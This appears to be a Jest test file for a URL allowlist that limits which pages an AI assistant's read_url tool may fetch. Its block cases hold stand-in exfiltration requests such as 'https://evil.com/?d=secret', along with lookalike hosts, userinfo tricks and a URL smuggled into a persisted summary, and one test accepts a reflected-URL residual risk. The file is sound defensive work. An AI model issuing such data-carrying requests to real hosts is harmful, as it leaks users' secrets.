import {
  URL_IMPLEMENTATIONS,
  expectUrlImplementationActive,
  useUrlImplementation,
} from '../../../../jest/urlImplementations';

import {ReadUrlEngine} from '../ReadUrlEngine';
import type {SearchAccess} from '../searchAccess';
import type {PageContent, SearchProvider} from '../../search/types';
import {resetReadUrlAllowlist, seedReadUrlAllowlist} from '../readUrlAllowlist';

const CANONICAL = Symbol('canonical');
const PAGE_HIT = 'https://src.test/page';
const NEUTRAL_HIT = 'https://neutral.test/';

type Row = {
  user?: string;
  assistant?: string;
  toolArg?: string;
  hit?: string;
  snippet?: string;
  persisted?: {summary: string; links?: string[]};
  page?: string;
  pageVia?: string;
  reset?: true;
  request: string;
  fetched: string | typeof CANONICAL | null;
};

type SeedMessage = {
  role: string;
  content?: unknown;
  tool_calls?: unknown;
  tool_call_id?: string;
};

type SeedOutcome = {
  toolName: string;
  result: {
    type: string;
    results?: {url: string; snippet: string}[];
    summary?: string;
    links?: string[];
  };
};

type SeedRow = {type: string; steps: {toolOutcomes: SeedOutcome[]}[]};

const seedMessages = (row: Row): SeedMessage[] => {
  const messages: SeedMessage[] = [];
  if (row.user) {
    messages.push({role: 'user', content: row.user});
  }
  if (row.assistant) {
    messages.push({role: 'assistant', content: row.assistant});
  }
  if (row.toolArg) {
    messages.push(
      {
        role: 'assistant',
        content: '',
        tool_calls: [
          {
            id: 'call-1',
            type: 'function',
            function: {
              name: 'read_url',
              arguments: JSON.stringify({url: row.toolArg}),
            },
          },
        ],
      },
      {role: 'tool', tool_call_id: 'call-1', content: 'done'},
    );
  }
  return messages;
};

const seedRows = (row: Row): SeedRow[] => {
  const outcomes: SeedOutcome[] = [];
  const hits: {url: string; snippet: string}[] = [];
  if (row.hit || row.snippet) {
    hits.push({url: row.hit ?? NEUTRAL_HIT, snippet: row.snippet ?? ''});
  }
  if (row.page !== undefined && !row.pageVia) {
    hits.push({url: PAGE_HIT, snippet: ''});
  }
  if (hits.length) {
    outcomes.push({
      toolName: 'web_search',
      result: {type: 'search', results: hits},
    });
  }
  if (row.persisted) {
    outcomes.push({
      toolName: 'read_url',
      result: {type: 'text', ...row.persisted},
    });
  }
  return outcomes.length
    ? [{type: 'assistant_turn', steps: [{toolOutcomes: outcomes}]}]
    : [];
};

const runRow = async (row: Row) => {
  let pageText: string | undefined;
  const read = jest.fn(
    async (url: string): Promise<PageContent> => ({
      url,
      text: pageText ?? 'ok',
    }),
  );
  const provider: SearchProvider = {id: 'exa', search: jest.fn(), read};
  const access: SearchAccess = {
    getActiveProvider: () => provider,
    canSearch: () => true,
    getResultCount: () => 3,
    readWithDefaultReader: jest.fn(),
  };
  const engine = new ReadUrlEngine(access);

  seedReadUrlAllowlist(seedMessages(row), seedRows(row));
  if (row.reset) {
    resetReadUrlAllowlist();
  }
  if (row.page !== undefined) {
    pageText = row.page;
    const pageResult = await engine.execute({url: row.pageVia ?? PAGE_HIT});
    expect(pageResult.type).toBe('text');
    pageText = undefined;
  }

  const readsBefore = read.mock.calls.length;
  const result = await engine.execute({url: row.request});
  const requestReads = read.mock.calls.slice(readsBefore);
  return {result, requestReads};
};

const canonicalOf = (request: string): string => {
  const url = new URL(request) as URL & {hash: string};
  url.hash = '';
  return url.toString();
};

const BULLET_PAGE = '**https://ex.org/a_b~c** and `https://ex.org/x_y`';

const ALLOW: Array<[string, Row]> = [
  [
    'any page on a bare host the user named',
    {
      user: 'web-site.com read in about pages',
      request: 'https://web-site.com/about',
      fetched: 'https://web-site.com/about',
    },
  ],
  [
    'other pages on the host of a URL the user wrote',
    {
      user: 'read https://web-site.com in about pages',
      request: 'https://web-site.com/about',
      fetched: CANONICAL,
    },
  ],
  [
    'the www form of a bare host the user named',
    {
      user: 'web-site.com',
      request: 'https://www.web-site.com/x?y=1',
      fetched: CANONICAL,
    },
  ],
  [
    'the bare form over http of a www host the user named',
    {
      user: 'www.web-site.com',
      request: 'http://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host whose first label starts with a digit',
    {
      user: '1password.com and 9gag.com',
      request: 'https://9gag.com/hot',
      fetched: CANONICAL,
    },
  ],
  [
    'another path on a host the user wrote with a path',
    {
      user: 'docs.example.co.uk/x',
      request: 'https://docs.example.co.uk/y?z=1',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote before a comma',
    {
      user: 'try sub.domain.io, please',
      request: 'https://sub.domain.io/a_b-c~d',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in mixed case before a period',
    {
      user: 'Read Web-Site.COM.',
      request: 'https://web-site.com/a',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in parentheses',
    {
      user: '(see web-site.com)',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote as a markdown link target',
    {
      user: '[x](web-site.com)',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in double quotes',
    {
      user: '"web-site.com"',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in angle brackets',
    {
      user: '<web-site.com>',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'the port the user wrote after a host',
    {
      user: 'web-site.com:8080/admin',
      request: 'https://web-site.com:8080/x',
      fetched: CANONICAL,
    },
  ],
  [
    'the default port of a host the user wrote with a port',
    {
      user: 'web-site.com:8080/admin',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'another page on an IP the user wrote as a URL',
    {
      user: 'http://192.168.1.10/',
      request: 'http://192.168.1.10/status',
      fetched: CANONICAL,
    },
  ],
  [
    'another page on the host of a user URL ending in parentheses',
    {
      user: 'https://en.wikipedia.org/wiki/Python_(programming_language)',
      request: 'https://en.wikipedia.org/wiki/Main_Page',
      fetched: CANONICAL,
    },
  ],
  [
    'a user-site request without its fragment',
    {
      user: 'web-site.com',
      request: 'https://web-site.com/a#top',
      fetched: 'https://web-site.com/a',
    },
  ],
  [
    'a www search hit requested from the bare host',
    {
      hit: 'https://www.firecrawl.dev/',
      request: 'https://firecrawl.dev/',
      fetched: 'https://www.firecrawl.dev/',
    },
  ],
  [
    'a search hit with a trailing slash requested without it',
    {
      hit: 'https://ex.com/a/',
      request: 'https://ex.com/a',
      fetched: 'https://ex.com/a/',
    },
  ],
  [
    'a search hit without a trailing slash requested with it',
    {
      hit: 'https://ex.com/a',
      request: 'https://ex.com/a/',
      fetched: 'https://ex.com/a',
    },
  ],
  [
    'an http search hit requested over https',
    {
      hit: 'http://ex.com/a',
      request: 'https://ex.com/a',
      fetched: 'http://ex.com/a',
    },
  ],
  [
    'an https search hit requested over http',
    {
      hit: 'https://ex.com/a',
      request: 'http://ex.com/a',
      fetched: 'https://ex.com/a',
    },
  ],
  [
    'a percent-encoded search hit requested with the decoded path',
    {
      hit: 'https://ex.com/caf%C3%A9',
      request: 'https://ex.com/café',
      fetched: 'https://ex.com/caf%C3%A9',
    },
  ],
  [
    'a page URL ending in parentheses before a period',
    {
      page: 'see https://en.wikipedia.org/wiki/Python_(programming_language).',
      request: 'https://en.wikipedia.org/wiki/Python_(programming_language)',
      fetched: 'https://en.wikipedia.org/wiki/Python_(programming_language)',
    },
  ],
  [
    'a bold page URL with an underscore and a tilde',
    {
      page: BULLET_PAGE,
      request: 'https://ex.org/a_b~c',
      fetched: 'https://ex.org/a_b~c',
    },
  ],
  [
    'a page URL in a code span',
    {
      page: BULLET_PAGE,
      request: 'https://ex.org/x_y',
      fetched: 'https://ex.org/x_y',
    },
  ],
  [
    'a page URL in a code span before a period',
    {
      page: 'Docs: `https://ex.org/d_e`.',
      request: 'https://ex.org/d_e',
      fetched: 'https://ex.org/d_e',
    },
  ],
  [
    'a page URL inside a parenthesized aside',
    {
      page: '(docs: https://ex.org/docs/v2?x=1)',
      request: 'https://ex.org/docs/v2?x=1',
      fetched: CANONICAL,
    },
  ],
  [
    'a link persisted from an earlier read',
    {
      persisted: {summary: 'page', links: ['https://ex.org/p']},
      request: 'https://ex.org/p',
      fetched: 'https://ex.org/p',
    },
  ],
  [
    'a URL written on a page read from a user site, with www and a trailing slash',
    {
      user: 'web-site.com',
      pageVia: 'https://web-site.com/',
      page: 'https://other.net/p',
      request: 'https://www.other.net/p/',
      fetched: 'https://other.net/p',
    },
  ],
  [
    'a host the user wrote between CJK ideographs',
    {
      user: '请读web-site.com的文档',
      request: 'https://web-site.com/docs',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in smart quotes',
    {
      user: '“web-site.com”',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in guillemets',
    {
      user: '«web-site.com»',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in fullwidth parentheses',
    {
      user: '（web-site.com）',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote after site:',
    {
      user: 'site:web-site.com',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote after a word and a colon',
    {
      user: 'Docs:web-site.com',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote before kana',
    {
      user: 'web-site.comを読んで',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote before an emoji',
    {
      user: 'check web-site.com🙂',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote before a check mark',
    {
      user: 'web-site.com✅',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote before a heart with a variation selector',
    {
      user: 'web-site.com❤️',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote after a copyright sign',
    {
      user: '©web-site.com',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
];

ALLOW.push(
  [
    'a URL the user wrote before a CJK full stop',
    {
      user: '请读https://web-site.com。',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a URL the user wrote in fullwidth parentheses',
    {
      user: '（https://web-site.com）',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a URL the user wrote before a fullwidth comma and more text',
    {
      user: '看https://web-site.com，谢谢',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a URL the user wrote before CJK letters',
    {
      user: '请帮我看看https://web-site.com的内容',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a URL the user wrote at the start before CJK letters',
    {
      user: 'https://web-site.com的文档',
      request: 'https://web-site.com/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a page URL in corner brackets',
    {
      page: '见「https://a.com/docs」',
      request: 'https://a.com/docs',
      fetched: 'https://a.com/docs',
    },
  ],
);

const BLOCK: Array<[string, Row]> = [
  [
    'a search hit with extra query data',
    {
      hit: 'https://ex.com/a',
      request: 'https://ex.com/a?d=secret',
      fetched: null,
    },
  ],
  [
    'a made-up path on a search hit site',
    {hit: 'https://ex.com/a', request: 'https://ex.com/b', fetched: null},
  ],
  [
    'a made-up URL on a page-link site',
    {
      page: 'https://evil.com/p',
      request: 'https://evil.com/?d=secret',
      fetched: null,
    },
  ],
  [
    'a made-up URL on a hostile search hit site',
    {
      hit: 'https://evil.com/x',
      request: 'https://evil.com/?d=secret',
      fetched: null,
    },
  ],
  ['a host named nowhere', {request: 'https://unknown.org/', fetched: null}],
  [
    'a lookalike suffix',
    {
      user: 'web-site.com',
      request: 'https://web-site.com.evil.com/?d=x',
      fetched: null,
    },
  ],
  [
    'a lookalike prefix',
    {
      user: 'web-site.com',
      request: 'https://evil-web-site.com/',
      fetched: null,
    },
  ],
  [
    'a different TLD',
    {user: 'web-site.com', request: 'https://web-site.co/', fetched: null},
  ],
  [
    'a user site written as userinfo of another host',
    {
      user: 'web-site.com',
      request: 'https://web-site.com@evil.com/',
      fetched: null,
    },
  ],
  [
    'a subdomain',
    {
      user: 'web-site.com',
      request: 'https://docs.web-site.com/',
      fetched: null,
    },
  ],
  [
    'a parent domain',
    {
      user: 'docs.example.co.uk',
      request: 'https://example.co.uk/',
      fetched: null,
    },
  ],
  [
    'a doubled www',
    {
      user: 'web-site.com',
      request: 'https://www.www.web-site.com/',
      fetched: null,
    },
  ],
  [
    'a URL only in assistant text',
    {
      assistant: 'https://web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a bare host only in assistant text',
    {
      assistant: 'web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a URL only in a tool-call argument',
    {
      toolArg: 'https://web-site.com/x',
      request: 'https://web-site.com/x',
      fetched: null,
    },
  ],
  [
    'a URL only in a search snippet',
    {
      snippet: 'see https://snip.com/x',
      request: 'https://snip.com/x',
      fetched: null,
    },
  ],
  [
    'a bare host in page text',
    {page: 'evil.com', request: 'https://evil.com/', fetched: null},
  ],
  [
    'a markdown link target in page text',
    {
      page: '[docs](https://ex.org/hidden) text',
      request: 'https://ex.org/hidden',
      fetched: null,
    },
  ],
  [
    'a page URL past the token budget',
    {
      page: 'a '.repeat(6000) + ' https://late.test/x',
      request: 'https://late.test/x',
      fetched: null,
    },
  ],
  [
    'the domain of an email address',
    {
      user: 'mail me@web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'the dotted local part of an email address',
    {
      user: 'user.name@web-site.com',
      request: 'https://user.name/',
      fetched: null,
    },
  ],
  [
    'the domain of an email address with a dotted local part',
    {
      user: 'user.name@web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  ...(
    [
      ['e.g.', 'https://e.g/'],
      ['i.e.', 'https://i.e/'],
      ['v1.2.3', 'https://v1.2.3/'],
    ] as const
  ).map(([word, request]): [string, Row] => [
    `${word} as a host`,
    {user: word, request, fetched: null},
  ]),
  [
    'a bare IP',
    {user: '192.168.1.10', request: 'http://192.168.1.10/', fetched: null},
  ],
  [
    'a host only in a credentialed user URL',
    {
      user: 'https://u:p@web-site.com/',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a file name in a path after a host',
    {user: 'x.com/notes.md', request: 'https://notes.md/', fetched: null},
  ],
  [
    'a user site after a reset with no seed',
    {
      user: 'web-site.com',
      reset: true,
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a URL smuggled into the header of a persisted read',
    {
      user: 'web-site.com',
      persisted: {
        summary: 'https://web-site.com/x]https://evil.com/?d=s\n\nbody',
        links: [],
      },
      request: 'https://evil.com/?d=s',
      fetched: null,
    },
  ],
  [
    'a host in the query of a user URL',
    {
      user: 'https://a.com/r?to=evil.com&ref=producthunt.com',
      request: 'https://evil.com/',
      fetched: null,
    },
  ],
  [
    'a second host in the query of a user URL',
    {
      user: 'https://a.com/r?to=evil.com&ref=producthunt.com',
      request: 'https://producthunt.com/',
      fetched: null,
    },
  ],
  [
    'a search hit query in another encoding',
    {
      hit: 'https://ex.com/s?q=a+b',
      request: 'https://ex.com/s?q=a%20b',
      fetched: null,
    },
  ],
  [
    'a prefix of a run whose last label is one letter',
    {user: 'foo.bar.c', request: 'https://foo.bar/', fetched: null},
  ],
  [
    'a non-ASCII host the user wrote as a URL',
    {
      user: 'https://bücher.de',
      request: 'https://bücher.de/über',
      fetched: null,
    },
  ],
  [
    'a non-ASCII bare host the user wrote',
    {user: 'bücher.de', request: 'https://bücher.de/über', fetched: null},
  ],
  [
    'the ASCII tail of a non-ASCII host the user wrote',
    {user: 'bücher.de', request: 'https://cher.de/', fetched: null},
  ],
  [
    'the ASCII tail of a Cyrillic host the user wrote',
    {user: 'пример2.com', request: 'https://2.com/', fetched: null},
  ],
  [
    'the userinfo name of a user URL with a password',
    {
      user: 'https://user.name:pw@web-site.com/',
      request: 'https://user.name/',
      fetched: null,
    },
  ],
  [
    'the host of a user URL with a password',
    {
      user: 'https://user.name:pw@web-site.com/',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a host after bare userinfo',
    {user: 'u:p@web-site.com', request: 'https://web-site.com/', fetched: null},
  ],
  [
    'a host after a comma in a user URL query',
    {
      user: 'https://a.com/r?x=1,evil.com:8/y',
      request: 'https://evil.com/',
      fetched: null,
    },
  ],
  [
    'the tail of a word with an underscore',
    {
      user: 'my_host.example.com',
      request: 'https://host.example.com/',
      fetched: null,
    },
  ],
  [
    'the ASCII tail of a decomposed accented host',
    {user: 'bu\u0308cher.de', request: 'https://cher.de/', fetched: null},
  ],
  [
    'the ASCII tail of a Vietnamese host',
    {user: 'điệnthoại.vn', request: 'https://i.vn/', fetched: null},
  ],
  [
    'the ASCII tail of a Vietnamese host in a URL',
    {user: 'https://việt.com', request: 'https://t.com/', fetched: null},
  ],
  [
    'the ASCII tail after an IPA letter',
    {user: 'ʃevil.com', request: 'https://evil.com/', fetched: null},
  ],
  [
    'the domain of an email address with a fullwidth at sign',
    {
      user: 'bob＠web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'the domain of an email address with a small at sign',
    {
      user: 'bob﹫web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
  [
    'a host in a query right after a user host',
    {
      user: 'https://a.com?to=evil.com',
      request: 'https://evil.com/',
      fetched: null,
    },
  ],
  [
    'a host in a fragment right after a user host',
    {user: 'a.com#x=evil.com', request: 'https://evil.com/', fetched: null},
  ],
  [
    'a host behind a non-http scheme',
    {
      user: 'ftp://web-site.com',
      request: 'https://web-site.com/',
      fetched: null,
    },
  ],
];

ALLOW.push(
  ...(
    [
      ['notes.txt', 'https://notes.txt/'],
      ['file.json', 'https://file.json/'],
      ['README.md', 'https://readme.md/'],
      ['Node.js', 'https://node.js/'],
    ] as const
  ).map(([word, request]): [string, Row] => [
    `the file name ${word} typed by the user, read as a host`,
    {user: word, request, fetched: CANONICAL},
  ]),
  [
    'a port the user wrote after a scheme URL',
    {
      user: 'https://web-site.com:8080',
      request: 'https://web-site.com:8080/x',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in bold',
    {
      user: '**web-site.com**',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'an upper-case URL the user wrote',
    {
      user: 'HTTPS://WEB-SITE.COM/A',
      request: 'https://web-site.com/b',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in single quotes',
    {
      user: "'web-site.com'",
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in backticks',
    {
      user: '`web-site.com`',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in square brackets',
    {
      user: '[web-site.com]',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'a host the user wrote in braces',
    {
      user: '{web-site.com}',
      request: 'https://web-site.com/',
      fetched: CANONICAL,
    },
  ],
  [
    'the first of two hosts the user joined with a bar',
    {user: 'a.com|b.com', request: 'https://a.com/', fetched: CANONICAL},
  ],
  [
    'the second of two hosts the user joined with a bar',
    {user: 'a.com|b.com', request: 'https://b.com/', fetched: CANONICAL},
  ],
  [
    'an IP URL the user wrote before a period',
    {
      user: 'see http://192.168.1.10.',
      request: 'http://192.168.1.10/status',
      fetched: CANONICAL,
    },
  ],
  [
    'a user URL with an @ in its path',
    {
      user: 'https://medium.com/@user',
      request: 'https://medium.com/x',
      fetched: CANONICAL,
    },
  ],
);

describe.each(URL_IMPLEMENTATIONS)(
  'read_url scenarios under %s',
  (_label, impl) => {
    useUrlImplementation(impl);

    it('runs against the swapped URL implementation', () => {
      expectUrlImplementationActive(impl);
    });

    it.each(ALLOW)('allows %s', async (_title, row) => {
      const {result, requestReads} = await runRow(row);
      const expected =
        row.fetched === CANONICAL ? canonicalOf(row.request) : row.fetched;
      expect(result.type).toBe('text');
      expect(requestReads.at(-1)?.[0]).toBe(expected);
    });

    it.each(BLOCK)('refuses %s', async (_title, row) => {
      const {result, requestReads} = await runRow(row);
      expect(result.type).toBe('error');
      expect(requestReads).toHaveLength(0);
    });

    it('accepts the residual that a user site reflecting a URL into its page lets that URL be read', async () => {
      const {result, requestReads} = await runRow({
        user: 'web-site.com',
        pageVia: 'https://web-site.com/search?q=https://evil.com/?d=s',
        page: 'results for https://evil.com/?d=s',
        request: 'https://evil.com/?d=s',
        fetched: 'https://evil.com/?d=s',
      });
      expect(result.type).toBe('text');
      expect(requestReads.at(-1)?.[0]).toBe('https://evil.com/?d=s');
    });
  },
);
